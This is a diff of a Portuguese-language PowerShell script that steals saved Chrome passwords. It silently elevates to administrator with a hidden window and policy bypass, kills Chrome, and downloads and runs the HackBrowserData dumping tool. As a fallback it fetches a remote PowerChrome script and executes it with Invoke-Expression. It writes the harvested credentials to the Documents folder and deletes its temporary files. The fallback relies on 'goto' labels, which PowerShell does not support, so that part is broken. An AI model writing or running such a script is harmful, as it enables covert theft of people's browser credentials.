@@ -1,102 +1,125 @@
-# ExtrairSenhas.ps1 - Versão com verificação robusta
+# ExtrairSenhas.ps1 - Versão CORRIGIDA
 
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Pribcipal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
     exit
 }
 
-$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
-$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
-$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"
+Write-Host "=== INICIANDO EXTRACAO DE SENHAS ===" -ForegroundColor Cyan
 
-Write-Host "=== INICIANDO EXTRACAO ===" -ForegroundColor Cyan
-
-# 1. Fecha o Chrome
+# Fecha o Chrome para liberar os arquivos
 Write-Host "Fechando Chrome..." -ForegroundColor Yellow
 Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
 Start-Sleep -Seconds 2
 
-# 2. Define caminhos sem espaços (usa TEMP raiz, evita problemas)
-$tempDir = "C:\Windows\Temp\hbd_temp"
-$zipPath = "C:\Windows\Temp\hbd.zip"
+# Define o caminho de saída
+$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
+$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
+$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"
+
+# ========== MÉTODO 1: HackBrowserData ==========
+Write-Host "Tentando HackBrowserData..." -ForegroundColor Cyan
+
+$tempDir = "C:\Windows\Temp\HBD"
+$zipPath = "$tempDir\hbd.zip"
 $exePath = "$tempDir\hack-browser-data.exe"
+$outputDir = "$tempDir\output"
 
-# 3. Cria a pasta TEMP
-if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
+# Cria pastas
+if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
 
-# 4. Baixa o HackBrowserData (versão estável v0.4.6 - mais atual)
+# Baixa o executável (versão 0.4.6 - mais recente)
 Write-Host "Baixando HackBrowserData..." -ForegroundColor Yellow
-$hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
+$url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
 
 try {
-    Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
-    Write-Host "Download concluido!" -ForegroundColor Green
+    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+    Write-Host "Download concluído!" -ForegroundColor Green
 } catch {
     Write-Host "ERRO no download: $_" -ForegroundColor Red
     "ERRO: Falha ao baixar a ferramenta." | Out-File -FilePath $arquivoSaida -Encoding UTF8
-    exit
+    goto metodo2
 }
 
-# 5. Extrai o arquivo
+# Extrai
 Write-Host "Extraindo..." -ForegroundColor Yellow
 try {
     Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force -ErrorAction Stop
-    Write-Host "Extracao concluida!" -ForegroundColor Green
+    Write-Host "Extração concluída!" -ForegroundColor Green
 } catch {
-    Write-Host "ERRO na extracao: $_" -ForegroundColor Red
-    "ERRO: Falha ao extrair a ferramenta." | Out-File -FilePath $arquivoSaida -Encoding UTF8
-    exit
+    Write-Host "ERRO na extração: $_" -ForegroundColor Red
+    goto metodo2
 }
 
-# 6. Verifica se o EXE existe
+# Verifica se o EXE existe
 if (-not (Test-Path $exePath)) {
-    Write-Host "ERRO: Arquivo $exePath nao encontrado!" -ForegroundColor Red
-    
-    # Tenta encontrar o EXE em qualquer lugar da pasta extraída
+    Write-Host "Procurando executável..." -ForegroundColor Yellow
     $exeEncontrado = Get-ChildItem -Path $tempDir -Filter "*.exe" -Recurse | Select-Object -First 1
     if ($exeEncontrado) {
         $exePath = $exeEncontrado.FullName
         Write-Host "EXE encontrado em: $exePath" -ForegroundColor Green
     } else {
-        "ERRO: Executavel nao encontrado apos extracao." | Out-File -FilePath $arquivoSaida -Encoding UTF8
-        exit
+        Write-Host "ERRO: Executável não encontrado!" -ForegroundColor Red
+        goto metodo2
     }
 }
 
-# 7. Executa a extração (usando & para executar)
+# Executa a extração
 Write-Host "Extraindo senhas (pode levar alguns segundos)..." -ForegroundColor Yellow
-$outputDir = "$env:TEMP\chrome_data"
-
 try {
-    # Executa o comando e captura a saída
-    $result = & $exePath -b chrome -f csv --dir $outputDir 2>&1
-    Write-Host "Comando executado!" -ForegroundColor Green
-    
-    # Aguarda o arquivo ser gerado
+    # Executa o comando
+    & $exePath -b chrome -f csv --dir $outputDir 2>&1 | Out-Null
     Start-Sleep -Seconds 3
     
-    # Procura pelo arquivo CSV gerado
-    $csvFile = Get-ChildItem -Path $outputDir -Filter "*.csv" -ErrorAction SilentlyContinue | Select-Object -First 1
+    # Procura o arquivo CSV gerado
+    $csvFile = Get-ChildItem -Path $outputDir -Filter "*password*.csv" -ErrorAction SilentlyContinue | Select-Object -First 1
     
     if ($csvFile -and (Test-Path $csvFile.FullName)) {
         Copy-Item $csvFile.FullName $arquivoSaida -Force
-        $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
-        Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida ($tamanho KB)" -ForegroundColor Green
+        Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida" -ForegroundColor Green
+        
+        # Limpeza
+        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+        exit
     } else {
-        Write-Host "Nenhum arquivo CSV foi gerado." -ForegroundColor Red
-        "Nenhuma senha encontrada ou erro na extracao." | Out-File -FilePath $arquivoSaida -Encoding UTF8
+        Write-Host "Nenhum arquivo CSV encontrado." -ForegroundColor Yellow
     }
 } catch {
     Write-Host "ERRO ao executar: $_" -ForegroundColor Red
-    "ERRO: $($_.Exception.Message)" | Out-File -FilePath $arquivoSaida -Encoding UTF8
 }
 
-# 8. Limpeza (opcional - comentado para debug)
-# Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-# Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-# Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
+# ========== MÉTODO 2: PowerChrome (Fallback) ==========
+:metodo2
+Write-Host "Tentando método alternativo (PowerChrome)..." -ForegroundColor Cyan
 
-Write-Host "Processo concluido!" -ForegroundColor Cyan
-Start-Sleep -Seconds 3
+try {
+    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
+    Invoke-Expression $script
+    $output = Invoke-PowerChrome -Browser Chrome 2>&1
+    
+    # Filtra apenas as linhas com dados úteis
+    $linhasUteis = $output | Where-Object { 
+        $_ -match "https?://" -or 
+        $_ -match "@" -or 
+        ($_ -match "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
+    }
+    
+    if ($linhasUteis.Count -gt 0) {
+        $linhasUteis | Out-File -FilePath $arquivoSaida -Encoding UTF8
+        Write-Host "SUCESSO! Senhas extraídas via PowerChrome." -ForegroundColor Green
+    } else {
+        "Nenhuma senha encontrada no Chrome." | Out-File -FilePath $arquivoSaida -Encoding UTF8
+        Write-Host "Nenhuma senha encontrada." -ForegroundColor Yellow
+    }
+} catch {
+    Write-Host "ERRO no PowerChrome: $_" -ForegroundColor Red
+    "ERRO completo: $($_.Exception.Message)" | Out-File -FilePath $arquivoSaida -Encoding UTF8
+}
+
+# Limpeza final
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+Write-Host "Processo concluído!" -ForegroundColor Cyan
+Start-Sleep -Seconds 2
 exit
